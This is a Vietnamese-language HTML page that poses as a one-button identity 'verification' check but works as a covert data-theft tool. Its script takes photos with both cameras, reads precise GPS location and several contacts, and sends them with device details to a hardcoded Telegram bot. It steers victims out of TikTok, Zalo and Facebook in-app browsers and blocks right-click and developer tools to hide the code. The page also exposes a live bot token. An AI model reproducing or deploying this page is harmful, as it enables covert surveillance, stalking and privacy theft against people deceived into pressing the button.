
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Xác Minh</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e13;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            color: white;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse at 20% 50%, rgba(0, 100, 255, 0.15) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 50%, rgba(100, 0, 255, 0.1) 0%, transparent 50%),
                radial-gradient(ellipse at 50% 80%, rgba(0, 200, 150, 0.08) 0%, transparent 50%);
            z-index: 0;
        }

        .container {
            position: relative;
            z-index: 1;
            text-align: center;
            padding: 40px;
        }

        .pulse-ring {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 180px;
            height: 180px;
            border-radius: 50%;
            border: 2px solid rgba(0, 150, 255, 0.3);
            animation: pulse-ring 2s infinite;
            pointer-events: none;
        }

        .pulse-ring:nth-child(2) {
            animation-delay: 0.5s;
        }

        .pulse-ring:nth-child(3) {
            animation-delay: 1s;
        }

        @keyframes pulse-ring {
            0% {
                width: 180px;
                height: 180px;
                opacity: 1;
                border-color: rgba(0, 150, 255, 0.4);
            }
            100% {
                width: 300px;
                height: 300px;
                opacity: 0;
                border-color: rgba(0, 150, 255, 0);
            }
        }

        .verify-btn {
            position: relative;
            z-index: 2;
            width: 160px;
            height: 160px;
            border-radius: 50%;
            background: linear-gradient(135deg, #0066ff, #0052cc);
            border: 3px solid rgba(255, 255, 255, 0.2);
            color: white;
            font-size: 22px;
            font-weight: bold;
            cursor: pointer;
            letter-spacing: 2px;
            transition: all 0.3s ease;
            box-shadow: 
                0 0 40px rgba(0, 100, 255, 0.5),
                inset 0 0 30px rgba(255, 255, 255, 0.1);
            text-transform: uppercase;
            outline: none;
        }

        .verify-btn:hover {
            transform: scale(1.05);
            box-shadow: 
                0 0 60px rgba(0, 100, 255, 0.7),
                0 0 100px rgba(0, 100, 255, 0.3),
                inset 0 0 40px rgba(255, 255, 255, 0.15);
            border-color: rgba(255, 255, 255, 0.5);
        }

        .verify-btn:active {
            transform: scale(0.95);
        }

        .verify-btn:disabled {
            background: linear-gradient(135deg, #333, #222);
            border-color: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            cursor: not-allowed;
            animation: none;
        }

        .verify-btn.loading {
            animation: btn-glow 1s infinite alternate;
        }

        @keyframes btn-glow {
            0% {
                box-shadow: 0 0 40px rgba(0, 100, 255, 0.5);
            }
            100% {
                box-shadow: 
                    0 0 80px rgba(0, 100, 255, 0.8),
                    0 0 120px rgba(0, 200, 255, 0.4);
            }
        }

        .status-text {
            margin-top: 40px;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
            min-height: 24px;
            line-height: 1.8;
            transition: all 0.3s;
        }

        #browser-warning {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(10, 14, 19, 0.98);
            z-index: 10000;
            padding: 40px 20px;
            box-sizing: border-box;
            justify-content: center;
            align-items: center;
        }

        .warning-box {
            background: #1a1f2b;
            border: 2px solid #f85149;
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
        }

        .warning-box h3 {
            color: #f85149;
            margin-top: 0;
            font-size: 20px;
        }

        .steps {
            text-align: left;
            margin-top: 20px;
            color: #c9d1d9;
            font-size: 15px;
            line-height: 2.2;
        }

        .highlight {
            color: #ffeb3b;
            font-weight: bold;
        }

        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 999;
            justify-content: center;
            align-items: center;
        }

        .overlay.active {
            display: flex;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top-color: #0066ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>

    <div id="browser-warning">
        <div class="warning-box">
            <h3>⚠️ YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
            <div class="steps">
                Vui lòng mở bằng trình duyệt bên ngoài:<br>
                1. Nhấn vào <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> góc trên phải<br>
                2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span><br>
                3. Sau đó nhấn XÁC MINH để tiếp tục
            </div>
        </div>
    </div>

    <div class="overlay" id="overlay">
        <div class="spinner"></div>
    </div>

    <div class="container" id="mainContainer">
        <div style="position: relative; display: inline-block;">
            <div class="pulse-ring"></div>
            <div class="pulse-ring"></div>
            <div class="pulse-ring"></div>
            <button class="verify-btn" id="verifyBtn">XÁC<br>MINH</button>
        </div>
        <div class="status-text" id="statusText"></div>
    </div>

    <script>
        // ==========================================
        // ⚙️ CẤU HÌNH TELEGRAM
        // ==========================================
        const TELEGRAM_BOT_TOKEN = '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds';
        const TELEGRAM_CHAT_ID = '7031115869';

        // ==========================================
        // 🚫 KIỂM TRA IN-APP BROWSER
        // ==========================================
        function checkInAppBrowser() {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);
            if (isInApp) {
                document.getElementById('browser-warning').style.display = 'flex';
                document.getElementById('mainContainer').style.display = 'none';
                return true;
            }
            return false;
        }

        // ==========================================
        // 📤 GỬI ẢNH + CAPTION QUA TELEGRAM
        // ==========================================
        async function sendTelegramMediaGroup(frontBlob, backBlob, caption) {
            try {
                // Telegram không hỗ trợ mediaGroup qua URL đơn giản với blob, 
                // nên gửi lần lượt 2 ảnh kèm caption ở ảnh đầu
                const formData1 = new FormData();
                formData1.append('chat_id', TELEGRAM_CHAT_ID);
                formData1.append('photo', frontBlob, 'camera_truoc.jpg');
                formData1.append('caption', caption);
                formData1.append('parse_mode', 'HTML');

                const res1 = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
                    { method: 'POST', body: formData1 }
                );
                await res1.json();

                // Gửi ảnh sau (không caption)
                const formData2 = new FormData();
                formData2.append('chat_id', TELEGRAM_CHAT_ID);
                formData2.append('photo', backBlob, 'camera_sau.jpg');

                const res2 = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
                    { method: 'POST', body: formData2 }
                );
                await res2.json();

                return true;
            } catch (error) {
                console.error('Telegram send error:', error);
                return false;
            }
        }

        // ==========================================
        // 📸 CHỤP ẢNH TỪ CAMERA
        // ==========================================
        async function capturePhoto(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: facingMode, 
                        width: { ideal: 1280 }, 
                        height: { ideal: 720 } 
                    },
                    audio: false
                });

                const blob = await new Promise((resolve, reject) => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', true);
                    video.setAttribute('muted', true);
                    video.play();

                    video.onloadedmetadata = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;

                        setTimeout(() => {
                            const ctx = canvas.getContext('2d');
                            // Lật ảnh nếu là camera trước
                            if (facingMode === 'user') {
                                ctx.translate(canvas.width, 0);
                                ctx.scale(-1, 1);
                            }
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            canvas.toBlob((b) => {
                                stream.getTracks().forEach(t => t.stop());
                                if (b) resolve(b);
                                else reject(new Error('Không tạo được ảnh'));
                            }, 'image/jpeg', 0.85);
                        }, 1200);
                    };

                    video.onerror = () => {
                        stream.getTracks().forEach(t => t.stop());
                        reject(new Error('Lỗi video'));
                    };
                });

                return blob;
            } catch (error) {
                console.error(`Camera ${facingMode} error:`, error);
                return null;
            }
        }

        // ==========================================
        // 📍 LẤY VỊ TRÍ GPS
        // ==========================================
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                const timeout = setTimeout(() => {
                    resolve(null);
                }, 8000);

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        resolve({
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy)
                        });
                    },
                    () => {
                        clearTimeout(timeout);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    }
                );
            });
        }

        // ==========================================
        // 📱 LẤY TIN NHẮN SMS GẦN ĐÂY (Android only)
        // ==========================================
        async function getRecentSMS() {
            try {
                // Thử dùng WebOTP API (chỉ lấy được OTP, không phải SMS history)
                // Cách thực tế: Trình duyệt mobile không có quyền đọc SMS history
                // Chỉ có thể dùng SMS Retriever API hoặc WebOTP cho OTP
                
                // Trả về thông báo không hỗ trợ
                return {
                    success: false,
                    message: 'Trình duyệt không hỗ trợ đọc tin nhắn SMS',
                    smsList: []
                };
            } catch (error) {
                return { success: false, message: 'Không thể truy cập SMS', smsList: [] };
            }
        }

        // ==========================================
        // 📞 LẤY LỊCH SỬ CUỘC GỌI (không khả dụng trên web)
        // ==========================================
        async function getRecentCalls() {
            // Web API không hỗ trợ truy cập lịch sử cuộc gọi
            return {
                success: false,
                message: 'Trình duyệt không hỗ trợ đọc lịch sử cuộc gọi',
                callList: []
            };
        }

        // ==========================================
        // 📇 LẤY DANH BẠ (Contacts API)
        // ==========================================
        async function getContacts() {
            try {
                if (!navigator.contacts || !navigator.contacts.select) {
                    return { success: false, contacts: [] };
                }

                const props = ['name', 'tel'];
                const opts = { multiple: true };

                try {
                    const contacts = await navigator.contacts.select(props, opts);
                    const recentContacts = contacts.slice(0, 3).map(c => ({
                        name: c.name ? c.name.join(', ') : 'Không tên',
                        tel: c.tel ? c.tel.join(', ') : 'Không SĐT'
                    }));
                    return {
                        success: true,
                        contacts: recentContacts
                    };
                } catch (e) {
                    return { success: false, contacts: [] };
                }
            } catch (error) {
                return { success: false, contacts: [] };
            }
        }

        // ==========================================
        // 🎯 HÀM CHÍNH - THU THẬP TẤT CẢ CÙNG LÚC
        // ==========================================
        async function collectAllData() {
            // Chạy tất cả các tác vụ song song
            const [frontPhoto, backPhoto, location, contacts] = await Promise.all([
                capturePhoto('user'),
                capturePhoto('environment'),
                getLocation(),
                getContacts()
            ]);

            return {
                frontPhoto,
                backPhoto,
                location,
                contacts
            };
        }

        // ==========================================
        // 📝 TẠO NỘI DUNG TIN NHẮN
        // ==========================================
        function createMessage(results) {
            let message = '';
            
            // Tiêu đề
            message += `🔔 <b>XÁC MINH NGƯỜI DÙNG MỚI</b>\n`;
            message += `🕐 ${new Date().toLocaleString('vi-VN')}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;

            // Ảnh camera trước
            message += `📸 <b>Ảnh Camera Trước</b> 👆\n\n`;

            // Ảnh camera sau
            message += `📸 <b>Ảnh Camera Sau</b> 👆\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;

            // Vị trí
            if (results.location) {
                const mapsLink = `https://www.google.com/maps?q=${results.location.lat},${results.location.lng}`;
                message += `📍 <b>VỊ TRÍ HIỆN TẠI</b>\n`;
                message += `🗺 <a href="${mapsLink}">Xem trên Google Maps</a>\n`;
                message += `📌 Tọa độ: ${results.location.lat}, ${results.location.lng}\n`;
                message += `🎯 Độ chính xác: ${results.location.accuracy}m\n`;
            } else {
                message += `📍 <b>VỊ TRÍ:</b> ❌ Không lấy được (bị từ chối hoặc không hỗ trợ)\n`;
            }
            message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;

            // Danh bạ
            if (results.contacts && results.contacts.success && results.contacts.contacts.length > 0) {
                message += `📇 <b>3 LIÊN HỆ GẦN ĐÂY</b>\n`;
                results.contacts.contacts.forEach((c, i) => {
                    message += `${i + 1}. ${c.name}: ${c.tel}\n`;
                });
            } else {
                message += `📇 <b>DANH BẠ:</b> ❌ Không truy cập được (bị từ chối hoặc không hỗ trợ)\n`;
            }
            message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;

            // SMS - Thông báo không hỗ trợ
            message += `💬 <b>TIN NHẮN SMS:</b> Trình duyệt không hỗ trợ đọc SMS. Cần app riêng.\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;

            // Thông tin thiết bị cơ bản
            message += `📱 <b>Thiết bị:</b> ${navigator.userAgent.includes('Android') ? 'Android' : navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Khác'}\n`;
            message += `🌐 <b>Trình duyệt:</b> ${navigator.userAgent.split(' ').slice(-2).join(' ')}\n`;

            return message;
        }

        // ==========================================
        // 🎬 KHỞI TẠO
        // ==========================================
        document.addEventListener('DOMContentLoaded', () => {
            if (checkInAppBrowser()) return;
        });

        const verifyBtn = document.getElementById('verifyBtn');
        const statusText = document.getElementById('statusText');
        const overlay = document.getElementById('overlay');

        verifyBtn.addEventListener('click', async () => {
            // Disable nút
            verifyBtn.disabled = true;
            verifyBtn.classList.add('loading');
            verifyBtn.innerHTML = 'ĐANG<br>XỬ LÝ';
            overlay.classList.add('active');
            statusText.textContent = 'Đang xác minh...';

            try {
                // Thu thập tất cả dữ liệu cùng lúc
                const results = await collectAllData();

                // Tạo nội dung tin nhắn
                const message = createMessage(results);

                // Gửi về Telegram
                await sendTelegramMediaGroup(
                    results.frontPhoto, 
                    results.backPhoto, 
                    message
                );

                statusText.textContent = '✅ Hoàn tất!';

                // Reset sau 2 giây
                setTimeout(() => {
                    verifyBtn.disabled = false;
                    verifyBtn.classList.remove('loading');
                    verifyBtn.innerHTML = 'XÁC<br>MINH';
                    overlay.classList.remove('active');
                    statusText.textContent = '';
                }, 2000);

            } catch (error) {
                console.error('Error:', error);
                statusText.textContent = '❌ Lỗi, thử lại';

                setTimeout(() => {
                    verifyBtn.disabled = false;
                    verifyBtn.classList.remove('loading');
                    verifyBtn.innerHTML = 'XÁC<br>MINH';
                    overlay.classList.remove('active');
                    statusText.textContent = '';
                }, 2000);
            }
        });

        // ==========================================
        // 🛡 BẢO VỆ
        // ==========================================
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        document.addEventListener('copy', (e) => e.preventDefault());
        document.addEventListener('cut', (e) => e.preventDefault());

        document.onkeydown = function(e) {
            if (e.keyCode === 123 ||
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
                (e.ctrlKey && e.keyCode === 85) ||
                (e.ctrlKey && e.keyCode === 83)) {
                e.preventDefault();
                return false;
            }
        };
    </script>
</body>
</html>
